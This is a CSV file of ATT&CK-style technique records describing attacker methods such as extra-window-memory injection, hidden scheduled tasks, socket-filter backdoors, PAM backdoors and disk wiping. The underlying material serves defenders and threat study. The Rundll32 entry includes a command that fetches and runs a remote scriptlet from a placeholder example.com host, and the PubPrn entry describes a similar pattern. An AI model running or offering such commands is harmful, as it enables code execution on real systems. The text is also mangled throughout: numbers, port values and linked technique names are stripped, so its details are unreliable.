id,type,attack_id,attack_name,attack_description
attack-pattern--0042a9f5-f053-4769-b3ef-9ad018dfa298,['enterprise-attack'],['T1055.011'],Extra Window Memory Injection,adversaries may inject malicious code into process via extra window memory  ewm  in order to evade process based defenses as well as possibly elevate privileges  ewm injection is a method of executing arbitrary code in the address space of a separate live process    before creating a window  graphical windows based processes must prescribe to or register a windows class  which stipulate appearance and behavior  via windows procedures  which are functions that handle input output of data _ citation  microsoft window classes  registration of new windows classes can include a request for up to    bytes of ewm to be appended to the allocated memory of each instance of that class  this ewm is intended to store data specific to that window and has specific application programming interface  api  functions to set and get its value   citation  microsoft getwindowlong function   citation  microsoft setwindowlong function   although small  the ewm is large enough to store a    bit pointer and is often used to point to a windows procedure  malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process s memory  placing a pointer to the code in ewm  then invoking execution by returning execution control to the address in the process s ewm_  execution granted through ewm injection may allow access to both the target process's memory and possibly elevated privileges  writing payloads to shared sections also avoids the use of highly monitored api calls such as writeprocessmemory and createremotethread_ citation  elastic process injection july       more sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention  dep  by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process    citation  malwaretech power loader aug        citation  welivesecurity gapz and redyms mar        running code in the context of another process may allow access to the process's memory  system network resources  and possibly elevated privileges  execution via ewm injection may also evade detection from security products since the execution is masked under a legitimate process 
attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9,['enterprise-attack'],['T1053.005'],Scheduled Task,adversaries may abuse the windows task scheduler to perform task scheduling for initial or recurring execution of malicious code  there are multiple ways to access the task scheduler in windows  the  utility can be run directly on the command line  or the task scheduler can be opened through the gui within the administrator tools section of the control panel  in some cases  adversaries have used a _net wrapper for the windows task scheduler  and alternatively  adversaries have used the windows netapi   library to create a scheduled task_  the deprecated  utility could also be abused by adversaries  ex   though at_exe can not access tasks created with schtasks or the control panel_  an adversary may use windows task scheduler to execute programs at system startup or on a scheduled basis for persistence  the windows task scheduler can also be abused to conduct remote execution as part of lateral movement and or to run a process under the context of a specified account  such as system   similar to  system binary proxy  adversaries have also abused the windows task scheduler to potentially mask one time execution under signed trusted system processes_ citation  proofpoint serpent   adversaries may also create  hidden  scheduled tasks  i_e   hide  that may not be visible to defender tools and manual queries used to enumerate tasks  specifically  an adversary may hide a task from  schtasks  query  and the task scheduler by deleting the associated security descriptor  sd  registry value  where deletion of this value must be completed using system permissions _ citation  tarrask scheduled task  adversaries may also employ alternate methods to hide tasks  such as altering the metadata  e_g_   index  value  within associated registry keys_ citation  defending against scheduled task attacks in windows environments 
attack-pattern--005cc321-08ce-4d17-b1ea-cb5275926520,['enterprise-attack'],['T1205.002'],Socket Filters,adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control  with elevated permissions  adversaries can use features such as the  libpcap  library to open sockets and install filters to allow or disallow certain types of data to come through the socket  the filter may apply to all traffic passing through the specified network interface  or every interface if not specified   when the network interface receives a packet matching the filter criteria  additional actions can be triggered on the host  such as activation of a reverse shell_  to establish a connection  an adversary sends a crafted packet to the targeted host that matches the installed filter criteria_ citation  haking  libpcap network sniffing  adversaries have used these socket filters to trigger the installation of implants  conduct ping backs  and to invoke command shells  communication with these socket filters may also be used in conjunction with  protocol  exatrack bpf filters passive backdoors  citation  leonardo turla penquin may        filters can be installed on any unix like platform with  libpcap  installed or on windows hosts using  winpcap    adversaries may use either  libpcap  with  pcap_setfilter  or the standard library function  setsockopt  with  so_attach_filter  options  since the socket connection is not active until the packet is received  this behavior may be difficult to detect due to the lack of activity on a host  low cpu overhead  and limited visibility into raw socket usage 
attack-pattern--00d0b012-8a03-410e-95de-5826bf542de6,['enterprise-attack'],['T1066'],Indicator Removal from Tools,if a malicious tool is detected and quarantined or otherwise curtailed  an adversary may be able to determine why the malicious tool was detected  the indicator   modify the tool by removing the indicator  and use the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems_  a good example of this is when malware is detected with a file signature and quarantined by anti virus software  an adversary who can determine that the malware was quarantined because of its file signature may use  software  or otherwise modify the file so it has a different signature  and then re use the malware 
attack-pattern--00f90846-cbd1-4fc5-9233-df5c2bf2a662,['enterprise-attack'],['T1560.001'],Archive via Utility,adversaries may use utilities to compress and or encrypt collected data prior to exfiltration  many utilities include functionalities to compress  encrypt  or otherwise package data into a format that is easier more secure to transport_  adversaries may abuse various utilities to compress or encrypt data before exfiltration  some third party utilities may be preinstalled  such as tar on linux and macos or zip on windows systems  on windows  diantz or  makecab may be used to package collected files into a cabinet  _cab  file  diantz may also be used to download and compress files from remote locations  i_e   remote data  additionally  xcopy on windows can copy files and directories with a variety of options_  adversaries may use also third party utilities  such as   zip  winrar  and winzip  to perform similar activities_ citation   zip homepage  citation  winrar homepage  citation  winzip homepage 
attack-pattern--01327cde-66c4-4123-bf34-5f258d59457b,['enterprise-attack'],['T1021.005'],VNC,adversaries may use  valid  to remotely control machines using virtual network computing  vnc    vnc is a platform independent desktop sharing system that uses the rfb   remote framebuffer   protocol to enable users to remotely control another computer s display by relaying the screen  mouse  and keyboard inputs over the network_ citation  the remote framebuffer protocol   vnc differs from  remote desktop  as vnc is screen sharing software rather than resource sharing software  by default  vnc uses the system's authentication  but it can be configured to use credentials specific to vnc_ citation  macos vnc software for remote desktop  citation  vnc authentication   adversaries may abuse vnc to perform malicious actions as the logged on user such as opening documents  downloading files  and running arbitrary commands  an adversary could use vnc to remotely control and monitor a system to collect data and information to pivot to other systems within the network  specific vnc libraries implementations have also been susceptible to brute force attacks and memory usage exploitation_ citation  hijacking vnc  citation  macos root vnc login without authentication  citation  vnc vulnerabilities  citation  offensive security vnc authentication check  citation  attacking vnc servers pentestlab  citation  havana authentication bug 
attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055,['enterprise-attack'],['T1047'],Windows Management Instrumentation,adversaries may abuse windows management instrumentation  wmi  to execute malicious commands and payloads  wmi is an administration feature that provides a uniform environment to access windows system components  the wmi service enables both local and remote access  though the latter is facilitated by  remote  such as  distributed component object   dcom  and  windows remote   winrm _ citation  msdn wmi  remote wmi over dcom operates using port      whereas wmi over winrm operates over port      when using http and      for https_ citation  msdn wmi  citation  fireeye wmi        an adversary can use wmi to interact with local and remote systems and use it as a means to execute various behaviors  such as gathering information for discovery as well as remote execution of files as part of lateral movement   citation  fireeye wmi sans        citation  fireeye wmi      
attack-pattern--01df3350-ce05-4bdf-bdf8-0a919a66d4a8,['enterprise-attack'],['T1156'],Malicious Shell Modification,adversaries may establish persistence through executing malicious commands triggered by a user s shell  user shells execute several configuration scripts at different points throughout the session based on events  for example  when a user opens a command line interface or remotely logs in  such as ssh  a login shell is initiated  the login shell executes scripts from the system   etc  and the user s home directory      to configure the environment  all login shells on a system use  etc profile when initiated  these configuration scripts run at the permission level of their directory and are often used to set environment variables  create aliases  and customize the user s environment  when the shell exits or terminates  additional shell scripts are executed to ensure the shell exits appropriately    adversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells  using bash as an example  the default shell for most gnu linux systems  adversaries may add commands that launch malicious binaries into the  etc profile and  etc profile_d files   these files require root permissions and are executed each time any shell on a system launches  for user level permissions  adversaries can insert malicious commands into   _bash_profile    _bash_login  or   _profile  rocke  which are sourced when a user opens a command line interface or connects remotely  adversaries often use   _bash_profile since the system only executes the first file that exists in the listed order  adversaries have also leveraged the   _bashrc file  tsunami  rocke  linux rabbit  magento  which is additionally executed if the connection is established remotely or an additional interactive shell is opened  such as a new tab in the command line interface  some malware targets the termination of a program to trigger execution  cannon   adversaries can use the   _bash_logout file to execute malicious commands at the end of a session pearl_shellbot     for macos  the functionality of this technique is similar but leverages zsh  the default shell for macos   _     when the terminal_app is opened  the application launches a zsh login shell and a zsh interactive shell  the login shell configures the system environment using  etc profile   etc zshenv   etc zprofile  and  etc zlogin  the login shell then configures the user environment with   _zprofile and   _zlogin  the interactive shell uses the   _zshrc to configure the user environment  upon exiting   etc zlogout and   _zlogout are executed  for legacy programs  macos executes  etc bashrc on startup 
attack-pattern--0259baeb-9f63-4c69-bf10-eb038c390688,['enterprise-attack'],['T1113'],Screen Capture,adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation  screen capturing functionality may be included as a feature of a remote access tool used in post compromise operations  taking a screenshot is also typically possible through native utilities or api calls  such as copyfromscreen  xwd  or screencapture_ citation  copyfromscreen _net  citation  antiquated mac malware 
attack-pattern--02fefddc-fb1b-423f-a76b-7552dd211d4d,['enterprise-attack'],['T1067'],Bootkit,a bootkit is a malware variant that modifies the boot sectors of a hard drive  including the master boot record  mbr  and volume boot record  vbr    citation  mtrends        adversaries may use bootkits to persist on systems at a layer below the operating system  which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly_      master boot record the mbr is the section of disk that is first loaded after completing hardware initialization by the bios  it is the location of the boot loader  an adversary who has raw access to the boot drive may overwrite this area  diverting execution during startup from the normal boot loader to adversary code   citation  lau            volume boot record the mbr passes control of the boot process to the vbr  similar to the case of mbr  an adversary who has raw access to the boot drive may overwrite the vbr to divert execution during startup to adversary code 
attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334,['enterprise-attack'],['T1037'],Boot or Logon Initialization Scripts,adversaries may use scripts automatically executed at boot or logon initialization to establish persistence  initialization scripts can be used to perform administrative functions  which may often execute other programs or send information to an internal logging server  these scripts can vary based on operating system and whether applied locally or remotely     adversaries may use these scripts to maintain persistence on a single system  depending on the access configuration of the logon scripts  either local credentials or an administrator account may be necessary    an adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges 
attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d,['enterprise-attack'],['T1557'],Adversary-in-the-Middle,adversaries may attempt to position themselves between two or more networked devices using an adversary in the middle  aitm  technique to support follow on behaviors such as  network  or  transmitted data  by abusing features of common networking protocols that can determine the flow of network traffic  e_g  arp  dns  llmnr  etc_   adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions_ citation  rapid  mitm basics   for example  adversaries may manipulate victim dns settings to enable other malicious activities such as preventing redirecting users from accessing legitimate sites and or pushing additional malware  adversaries may also manipulate dns and leverage their position in order to intercept user credentials and session cookies   downgrade  can also be used to establish an aitm position  such as by negotiating a less secure  deprecated  or weaker version of communication protocol  ssl tls  or encryption algorithm_  adversaries may also leverage the aitm position to attempt to monitor and or modify traffic  such as in  transmitted data  adversaries can setup a position similar to aitm to prevent traffic from flowing to the appropriate destination  potentially to  impair  and or in support of a  network denial of
attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104,['enterprise-attack'],['T1033'],System Owner/User Discovery,adversaries may attempt to identify the primary user  currently logged in user  set of users that commonly uses a system  or whether a user is actively using the system  they may do this  for example  by retrieving account usernames or by using  os credential  the information may be collected in a number of different ways using other discovery techniques  because user and username details are prevalent throughout a system and include running process ownership  file directory ownership  session information  and system logs  adversaries may use the information from  system owner user  during automated discovery to shape follow on behaviors  including whether or not the adversary fully infects the target and or attempts specific actions_  various utilities and commands may acquire this information  including whoami  in macos and linux  the currently logged in user can be identified with w and who  on macos the dscl   list  users   grep  v '_' command can also be used to enumerate user accounts  environment variables  such as  username  and  user  may also be used to access this information 
attack-pattern--0458aab9-ad42-4eac-9e22-706a95bafee2,['enterprise-attack'],['T1583'],Acquire Infrastructure,adversaries may buy  lease  or rent infrastructure that can be used during targeting  a wide variety of infrastructure exists for hosting and orchestrating adversary operations  infrastructure solutions include physical or cloud servers  domains  and third party web services  additionally  botnets are available for rent or purchase_  use of these infrastructure solutions allows an adversary to stage  launch  and execute an operation  solutions may help adversary operations blend in with traffic that is seen as normal  such as contact to third party web services  depending on the implementation  adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned  modified  and shut down 
attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5,['enterprise-attack'],['T1218.011'],Rundll32,adversaries may abuse rundll  _exe to proxy execution of malicious code  using rundll  _exe  vice executing directly  i_e   shared  may avoid triggering security tools that may not monitor execution of the rundll  _exe process because of allowlists or false positives from normal operations  rundll  _exe is commonly associated with executing dll payloads  ex  rundll  _exe  dllname  dllfunction  _  rundll  _exe can also be used to execute  control  item files  _cpl  through the undocumented shell  _dll functions control_rundll and control_rundllasuser  double clicking a _cpl file also causes rundll  _exe to execute   citation  trend micro cpl   rundll   can also be used to execute scripts such as javascript  this can be done using a syntax similar to this  rundll  _exe javascript   __ mshtml runhtmlapplication   document_write   getobject  script https     www _ example _ com malicious_sct     this behavior has been seen used by malware such as poweliks   citation  this is security command line confusion   adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll  _exe loads dll function names  as part of windows compatibility support for various character sets  rundll  _exe will first check for wide unicode then ansi character supported functions before loading the specified function  e_g_  given the command rundll  _exe exampledll_dll  examplefunction  rundll  _exe would first attempt to execute examplefunctionw  or failing that examplefunctiona  before loading examplefunction   adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending w and or a to harmless ones_ citation  attackify rundll  _exe obscurity  citation  github norundll  dll functions can also be exported and executed by an ordinal number  ex  rundll  _exe file_dll    _  additionally  adversaries may use  techniques  such as changing dll file names  file extensions  or function names  to further conceal execution of a malicious payload_ citation  rundll  _exe defense evasion 
attack-pattern--0470e792-32f8-46b0-a351-652bc35e9336,['enterprise-attack'],['T1613'],Container and Resource Discovery,adversaries may attempt to discover containers and other resources that are available within a containers environment  other resources may include images  deployments  pods  nodes  and other information such as the status of a cluster_  these resources can be viewed within web applications such as the kubernetes dashboard or can be queried via the docker and kubernetes apis_ citation  docker api  citation  kubernetes api  in docker  logs may leak information about the environment  such as the environment s configuration  which services are available  and what cloud provider the victim may be utilizing  the discovery of these resources may inform an adversary s next steps in the environment  such as how to perform lateral movement and which methods to utilize for execution 
attack-pattern--04a5a8ab-3bc8-4c83-95c9-55274a89786d,['enterprise-attack'],['T1583.007'],Serverless,adversaries may purchase and configure serverless cloud infrastructure  such as cloudflare workers or aws lambda functions  that can be used during targeting  by utilizing serverless infrastructure  adversaries can make it more difficult to attribute infrastructure used during operations back to them_  once acquired  the serverless runtime environment can be leveraged to either respond directly to infected machines or to  traffic to an adversary owned command and control server_ citation  blackwater malware cloudflare workers  citation  aws lambda redirector  as traffic generated by these functions will appear to come from subdomains of common cloud providers  it may be difficult to distinguish from ordinary traffic to these providers_ citation  detecting command   control in the cloud  citation  blackwater malware cloudflare workers 
attack-pattern--04ee0cb7-dac3-4c6c-9387-4c6aa096f4cf,['enterprise-attack'],['T1143'],Hidden Window,adversaries may implement hidden windows to conceal malicious activity from the plain sight of users  in some cases  windows that would typically be displayed when an application carries out an operation can be hidden  this may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks  adversaries may abuse operating system functionality to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system_      windows there are a variety of features in scripting languages in windows  such as  jscript  and vbscript to make windows hidden  one example of this is powershell_exe  windowstyle hidden    citation  powershell about            mac the configurations for how applications run on macos are listed in property list  plist  files  one of the tags in these files can be apple_awt_uielement  which allows for java applications to prevent the application's icon from appearing in the dock  a common use for this is when applications run in the system tray  but don't also want to show up in the dock  however  adversaries can abuse this feature and hide their running window_ citation  antiquated mac malware 
attack-pattern--04ef4356-8926-45e2-9441-634b6f3dcecb,['enterprise-attack'],['T1161'],LC_LOAD_DYLIB Addition,mach o binaries have a series of headers that are used to perform certain operations when a binary is loaded  the lc_load_dylib header in a mach o binary tells macos and os x which dynamic libraries  dylibs  to load during execution time  these can be added ad hoc to the compiled binary as long adjustments are made to the rest of the fields and dependencies  citation  writing bad malware for osx   there are tools available to perform these changes  any changes will invalidate digital signatures on binaries because the binary is being modified  adversaries can remediate this issue by simply removing the lc_code_signature command from the binary so that the signature isn t checked at load time  citation  malware persistence on os x  
attack-pattern--04fd5427-79c7-44ea-ae13-11b24778ff1c,['enterprise-attack'],['T1132.001'],Standard Encoding,adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect  command and control  c   information can be encoded using a standard data encoding system that adheres to existing protocol specifications  common data encoding schemes include ascii  unicode  hexadecimal  base    and mime_ citation  wikipedia binary to text encoding   citation  wikipedia character encoding  some data encoding systems may also result in data compression  such as gzip 
attack-pattern--0533ab23-3f7d-463f-9bd8-634d27e4dee1,['enterprise-attack'],['T1027.009'],Embedded Payloads,adversaries may embed payloads within other files to conceal malicious content from defenses  otherwise seemingly benign files  such as scripts and executables  may be abused to carry and obfuscate malicious payloads and content  in some cases  embedded payloads may also enable adversaries to  subvert trust  by not impacting execution controls such as digital signatures and notarization tickets_ citation  sentinel labs    adversaries may embed payloads in various file formats to hide payloads_ citation  microsoft learn  this is similar to  though does not involve weaving malicious content into specific bytes and patterns related to legitimate digital media formats_ citation  github psimage    for example  adversaries have been observed embedding payloads within or as an overlay of an otherwise benign binary_ citation  securelist dtrack   adversaries have also been observed nesting payloads  such as executables and run only scripts  inside a file of the same format_ citation  sentinellabs reversing run only applescripts         embedded content may also be used as  process  payloads used to infect benign system processes_ citation  trend micro  these embedded then injected payloads may be used as part of the modules of malware designed to provide specific features such as encrypting c  communications in support of an orchestrator module  for example  an embedded module may be injected into default browsers  allowing adversaries to then communicate via the network_ citation  malware analysis report comrat 
attack-pattern--06780952-177c-4247-b978-79c357fb311f,['enterprise-attack'],['T1150'],Plist Modification,property list  plist  files contain all of the information that macos and os x uses to configure applications and services  these files are utf   encoded and formatted like xml documents via a series of keys surrounded by   they detail when programs should execute  file paths to the executables  program arguments  required os permissions  and many others  plists are located in certain locations depending on their purpose such as  library preferences  which execute with elevated privileges  and   library preferences  which execute with a user's privileges    adversaries can modify these plist files to point to their own code  can use them to execute their code in the context of another user  bypass whitelisting procedures  or even use them as a persistence mechanism   citation  sofacy komplex trojan 
attack-pattern--06c00069-771a-4d57-8ef5-d3718c1a8771,['enterprise-attack'],['T1556.003'],Pluggable Authentication Modules,adversaries may modify pluggable authentication modules  pam  to access user credentials or enable otherwise unwarranted access to accounts  pam is a modular system of configuration files  libraries  and executable files which guide authentication for many services  the most common authentication module is pam_unix_so  which retrieves  sets  and verifies account authentication information in  etc passwd and  etc shadow_ citation  apple pam  citation  man pam_unix  citation  red hat pam   adversaries may modify components of the pam system to create backdoors  pam components  such as pam_unix_so  can be patched to accept arbitrary adversary supplied values as legitimate credentials_ citation  pam backdoor   malicious modifications to the pam system may also be abused to steal credentials  adversaries may infect pam resources with code to harvest user credentials  since the values exchanged with pam components may be plain text since pam does not store passwords_ citation  pam creds  citation  apple pam 
attack-pattern--0708ae90-d0eb-4938-9a76-d0fc94f6eec1,['enterprise-attack'],['T1578.004'],Revert Cloud Instance,an adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence  in highly virtualized environments  such as cloud based infrastructure  this may be accomplished by restoring virtual machine  vm  or data storage snapshots through the cloud management dashboard or cloud apis_  another variation of this technique is to utilize temporary storage attached to the compute instance  most cloud providers provide various types of storage including persistent  local  and or ephemeral  with the ephemeral types often reset upon stop restart of the vm_ citation  tech republic   restore aws snapshots  citation  google   restore cloud snapshot 
attack-pattern--086952c4-5b90-4185-b573-02bad8e11953,['enterprise-attack'],['T1148'],HISTCONTROL,the histcontrol environment variable keeps track of what should be saved by the history command and eventually into the   _bash_history file when a user logs out  this setting can be configured to ignore commands that start with a space by simply setting it to  ignorespace   histcontrol can also be set to ignore duplicate commands by setting it to  ignoredups   in some linux systems  this is set by default to  ignoreboth  which covers both of the previous examples  this means that   ls  will not be saved  but  ls  would be saved by history  histcontrol does not exist by default on macos  but can be set by the user and will be respected  adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands 
attack-pattern--09312b1a-c3c6-4b45-9844-3ccc78e5d82f,['enterprise-attack'],['T1592'],Gather Victim Host Information,adversaries may gather information about the victim's hosts that can be used during targeting  information about hosts may include a variety of details  including administrative data  ex  name  assigned ip  functionality  etc_  as well as specifics regarding its configuration  ex  operating system  language  etc_ _  adversaries may gather this information in various ways  such as direct collection actions via  active  or  phishing for  adversaries may also compromise sites then include malicious content designed to collect host information from visitors_ citation  att scanbox  information about hosts may also be exposed to adversaries via online or other accessible data sets  ex   social  or  search victim owned  gathering this information may reveal opportunities for other forms of reconnaissance  ex   search open  or  search open technical  establishing operational resources  ex   develop  or  obtain  and or initial access  ex   supply chain  or  external remote
attack-pattern--0979abf9-4e26-43ec-9b6e-54efc4e70fca,['enterprise-attack'],['T1596.003'],Digital Certificates,adversaries may search public digital certificate data for information about victims that can be used during targeting  digital certificates are issued by a certificate authority  ca  in order to cryptographically verify the origin of signed content  these certificates  such as those used for encrypted web traffic  https ssl tls communications   contain information about the registered organization such as name and location_  adversaries may search digital certificate data to gather actionable information  threat actors can use online resources and lookup tools to harvest information about certificates_ citation  sslshopper lookup  digital certificate data may also be available from artifacts signed by the organization  ex  certificates used from encrypted web traffic are served with content _ citation  medium ssl cert  information from these sources may reveal opportunities for other forms of reconnaissance  ex   active  or  phishing for  establishing operational resources  ex   develop  or  obtain  and or initial access  ex   external remote  or  trusted
attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4,['enterprise-attack'],['T1056.001'],Keylogging,adversaries may log user keystrokes to intercept credentials as the user types them  keylogging is likely to be used to acquire credentials for new access opportunities when  os credential  efforts are not effective  and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured_  keylogging is the most prevalent type of input capture  with many different ways of intercepting keystrokes_ citation  adventures of a keystroke  some methods include     hooking api callbacks used for processing keystrokes  unlike  credential api  this focuses solely on api functions intended for processing keystroke data_   reading raw keystroke data from the hardware buffer_   windows registry modifications_   custom drivers_    modify system  may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions_ citation  cisco blog legacy device attacks 
attack-pattern--09b130a2-a77e-4af0-a361-f46f9aad1345,['enterprise-attack'],['T1222.002'],Linux and Mac File and Directory Permissions Modification,adversaries may modify file or directory permissions attributes to evade access control lists  acls  and access protected files_ citation  hybrid analysis icacls  june       citation  hybrid analysis icacls  may       file and directory permissions are commonly managed by acls configured by the file or directory owner  or users with the appropriate permissions  file and directory acl implementations vary by platform  but generally explicitly designate which users or groups can perform which actions  read  write  execute  etc_ _  most linux and linux based platforms provide a standard set of permission groups  user  group  and other  and a standard set of permissions  read  write  and execute  that are applied to each group  while nuances of each platform s permissions implementation may vary  most of the platforms provide two primary commands used to manipulate file and directory acls  chown  short for change owner   and chmod  short for change mode _  adversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it  they could subsequently lock others out of the file  specific file and directory modifications may be a required step for many techniques  such as establishing persistence via  unix shell configuration  or tainting hijacking other instrumental binary configuration files via  hijack execution     macos common tools and techniques 
attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119,['enterprise-attack'],['T1110.001'],Password Guessing,adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts  without knowledge of the password for an account  an adversary may opt to systematically guess the password using a repetitive or iterative mechanism  an adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords  password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts_  guessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts  depending on the organization's login failure policies   citation  cylance cleaver   typically  management services over commonly used ports are used when guessing passwords  commonly targeted services include the following     ssh     tcp    telnet     tcp    ftp     tcp    netbios   smb   samba      tcp       tcp    ldap      tcp    kerberos     tcp    rdp   terminal services       tcp    http http management services     tcp       tcp    mssql       tcp    oracle       tcp    mysql       tcp    vnc       tcp    snmp      udp and     tcp udp   in addition to management services  adversaries may  target single sign on  sso  and cloud based applications utilizing federated authentication protocols   as well as externally facing email applications  such as office    _ citation  us cert ta      a        further  adversaries may abuse network device interfaces  such as  wlanapi   to brute force accessible wifi router s  via wireless authentication protocols_ citation  trend micro emotet        in default environments  ldap and kerberos connection attempts are less likely to trigger events over smb  which creates windows  logon failure  event id      
attack-pattern--09cd431f-eaf4-4d2a-acaf-2a7acfe7ed58,['enterprise-attack'],['T1216.001'],PubPrn,adversaries may use pubprn to proxy execution of malicious remote files  pubprn_vbs is a  visual  script that publishes a printer to active directory domain services  the script may be signed by microsoft and is commonly executed through the  windows command  via cscript_exe  for example  the following code publishes a printer within the specified domain  cscript pubprn printer  ldap   cn container  dc domain  dc com_  adversaries may abuse pubprn to execute malicious payloads hosted on remote sites_ citation  enigma x  pubprn bypass  to do so  adversaries may set the second script  parameter to reference a scriptlet file  _sct  hosted on a remote site  an example command is pubprn_vbs    _ _ _   this behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script_  in later versions of windows        pubprn_vbs has been updated to prevent proxying execution from a remote site  this is done by limiting the protocol specified in the second parameter to ldap     vice the script  moniker which could be used to reference remote code via http s  
attack-pattern--0a241b6c-7bb2-48f9-98f7-128145b4d27f,['enterprise-attack'],['T1597.002'],Purchase Technical Data,adversaries may purchase technical information about victims that can be used during targeting  information about victims may be available for purchase within reputable private sources and databases  such as paid subscriptions to feeds of scan databases or other data aggregation services  adversaries may also purchase information from less reputable sources such as dark web or cybercrime blackmarkets_  adversaries may purchase information about their already identified targets  or use purchased data to discover opportunities for successful breaches  threat actors may gather various technical details from purchased data  including but not limited to employee contact information  credentials  or specifics regarding a victim s infrastructure_ citation  zdnet selling data  information from these sources may reveal opportunities for other forms of reconnaissance  ex   phishing for  or  search open  establishing operational resources  ex   develop  or  obtain  and or initial access  ex   external remote  or  valid
attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22,['enterprise-attack'],['T1003'],OS Credential Dumping,adversaries may attempt to dump credentials to obtain account login and credential material  normally in the form of a hash or a clear text password  from the operating system and software  credentials can then be used to perform  lateral  and access restricted information_  several of the tools mentioned in associated sub techniques may be used by both adversaries and professional security testers  additional custom tools likely exist as well_
attack-pattern--0a5231ec-41af-4a35-83d0-6bdf11f28c65,['enterprise-attack'],['T1129'],Shared Modules,adversaries may execute malicious payloads via loading shared modules  the windows module loader can be instructed to load dlls from arbitrary local paths and arbitrary universal naming convention  unc  network paths  this functionality resides in ntdll_dll and is part of the windows  native  which is called from functions like createprocess  loadlibrary  etc  of the win   api_ citation  wikipedia windows library files   the module loader can load dlls     via specification of the  fully qualified or relative  dll pathname in the import directory         via export forwarded to another dll  specified with  fully qualified or relative  pathname  but without extension          via an ntfs junction or symlink program_exe_local with the fully qualified or relative pathname of a directory containing the dlls specified in the import directory or forwarded exports         via   x c file name  filename_extension  loadfrom  fully qualified or relative pathname   x e  in an embedded or external  application manifest   the file name refers to an entry in the import directory or a forwarded export_  adversaries may use this functionality as a way to execute arbitrary payloads on a victim system  for example  malware may execute share modules to load additional components or features 
attack-pattern--0ad7bc5c-235a-4048-944b-3b286676cb74,['enterprise-attack'],['T1602'],Data from Configuration Repository,adversaries may collect data related to managed devices from configuration repositories  configuration repositories are used by management systems in order to configure  manage  and control data on remote systems  configuration repositories may also facilitate remote access and administration of devices_  adversaries may target these repositories in order to collect large quantities of sensitive system administration data  data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data  much of which may align with adversary discovery objectives_ citation  us cert ta      a snmp abuse      
attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9,['enterprise-attack'],['T1561.002'],Disk Structure Wipe,adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system  targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources    adversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record  mbr  or partition table_ citation  symantec shamoon       citation  fireeye shamoon nov       citation  palo alto shamoon nov       citation  kaspersky stonedrill       citation  unit    shamoon        the data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk  if this information is not present  the computer will not be able to load an operating system during the boot process  leaving the computer unavailable   disk structure  may be performed in isolation  or along with  disk content  if all sectors of a disk are wiped_  to maximize impact on the target organization  malware designed for destroying disk structures may have worm like features to propagate across a network by leveraging other techniques like  valid   os credential  and  smb windows admin  symantec shamoon       citation  fireeye shamoon nov       citation  palo alto shamoon nov       citation  kaspersky stonedrill      
attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3,['enterprise-attack'],['T1498.001'],Direct Network Flood,adversaries may attempt to cause a denial of service  dos  by directly sending a high volume of network traffic to a target  this dos attack may also reduce the availability and functionality of the targeted system s  and network   direct network  are when one or more systems are used to send a high volume of network packets towards the targeted service's network  almost any network protocol may be used for flooding  stateless protocols such as udp or icmp are commonly used but stateful protocols such as tcp can be used as well_  botnets are commonly used to conduct network flooding attacks against networks and services  large botnets can generate a significant amount of traffic from systems spread across the global internet  adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack  in some of the worst cases for distributed dos  ddos   so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network  in such circumstances  distinguishing ddos traffic from legitimate clients becomes exceedingly difficult  botnets have been used in some of the most high profile ddos flooding attacks  such as the      series of incidents that targeted major us banks_ citation  usnyag iranianbotnet march      
attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92,['enterprise-attack'],['T1492'],Stored Data Manipulation,adversaries may insert  delete  or manipulate data at rest in order to manipulate external outcomes or hide activity_ citation  fireeye apt   oct       citation  doj lazarus sony       by manipulating stored data  adversaries may attempt to affect a business process  organizational understanding  and decision making    stored data could include a variety of file formats  such as office files  databases  stored emails  and custom file formats  the type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary  for complex systems  an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact 
